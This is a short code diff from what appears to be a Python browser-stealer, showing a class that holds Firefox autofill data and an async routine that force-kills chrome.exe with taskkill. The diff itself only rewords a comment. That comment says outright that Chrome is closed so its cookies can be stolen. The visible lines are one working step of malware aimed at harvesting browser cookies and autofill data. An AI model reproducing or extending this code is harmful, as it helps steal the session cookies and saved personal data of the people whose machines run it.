@@ -130,7 +130,7 @@ class Main:
         self.FirefoxAutofiList = list()
     async def main(self):
         try:
-            # new versions of chrome its save the 'cookies' so we have to close it for steal cookies ;)
+            # new versions of chrome its protect the 'cookies' so we have to close it for steal cookies ;)
             processes = await asyncio.create_subprocess_shell(f"taskkill /F /IM chrome.exe", shell=True, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
             await processes.communicate() 
         except:pass
